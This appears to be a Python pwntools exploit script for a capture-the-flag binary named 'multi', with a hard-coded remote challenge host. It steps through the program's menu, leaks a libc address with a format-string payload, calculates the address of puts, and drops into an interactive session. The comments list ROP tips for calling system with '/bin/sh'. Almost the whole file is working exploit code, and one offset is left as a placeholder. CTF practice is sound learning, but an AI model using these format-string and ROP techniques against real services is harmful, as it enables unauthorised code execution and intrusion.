#!/usr/bin/python2

# some helpful urls
# https://github.com/Naetw/CTF-pwn-tips
# http://ctfhacker.com/ctf/pwnable/2015/08/18/campctf-bitterman.html
# https://github.com/nnamon/linux-exploitation-course

# some certain helpful pwntools commands

# system_off = libc.symbols['system']
# binsh = next(libc.search('/bin/sh\x00'))
# rop2.system(next(libc.search('/bin/sh\x00'))) and print rop2.dump()

# elf = ELF('./binary')
# rop = ROP(elf)
# rop.puts(elf.got['puts'])
# rop.call(elf.symbols['main'])

#http://docs.pwntools.com/en/stable/context.html?highlight=context#pwnlib.context.ContextType.architectures

from pwn import *
import sys
import time

#context(arch='x64', os='linux', 'endian': 'little')

LOCAL = True

HOST = "35.198.113.131"
PORT = 31337
BINARY = "./multi"
LIB = ""
def exploit(r):
    """Stage 1"""
    r.recvuntil('Enter two numbers: ')
    r.sendline('-1 1336')
    """Stage2"""
    ctr=20
    while ctr>0:
        r.recvuntil('>> ')
        r.sendline('2')
        r.recvuntil('inclusive: ')
        r.sendline('250')
        ctr-=1
    r.recvuntil('>> ')
    r.sendline('2')
    r.recvuntil('inclusive: ')
    r.sendline('1')
    
    r.recvuntil('>> ')
    r.sendline('1')
    r.recvuntil('inclusive: ')
    r.sendline('250')

    time.sleep(4)

    r.recvuntil('>> ')
    r.sendline('2')
    r.recvuntil('inclusive: ')
    r.sendline('149')

    ctr=40
    while ctr>0:
        r.recvuntil('>> ')
        r.sendline('2')
        r.recvuntil('inclusive: ')
        r.sendline('249')
        ctr-=1
    r.recvuntil('>> ')
    r.sendline('2')
    r.recvuntil('inclusive: ')
    r.sendline('250')

    """Stage 3"""
    offset=9999 #put offset here
    r.recvuntil('yourself: \n')
    r.sendline("%{}$p".format(offset))   
    r.recvline()
    val=r.recvline().strip()[::-1].strip()[::-1]
    val=int(val,16)
    val-=0x1bd8c0 #subtract to get libc_base
    val+=0x71b00 #add to get the value of puts
    log.success('puts at {}'.format(hex(val)))
    r.recvuntil('puts function\n')
    r.sendline(str(val))

    """Stage 4"""
    r.recvuntil(">>")
    r.sendline('1')
    r.recvuntil(">>")
    r.sendline('2')
    r.recvuntil(">>")
    r.sendline('3')
    r.sendline('4199982')
    r.recvuntil(">>")
    r.sendline('4')
    r.interactive()
    return

if __name__=="__main__":
    #binary = ELF(BINARY, checksec = False)
    #lib = ELF(LIB, checksec = False)
    #rop = ROP(lib)

    if len(sys.argv) > 1:
        LOCAL = False
        r = remote(HOST, PORT)
        exploit(r)
    else:
        LOCAL = True
        r = process(BINARY)#,env={'LD_PRELOAD':LIB}) #remove the ')#'
        print (util.proc.pidof(r))
        pause()
        exploit(r)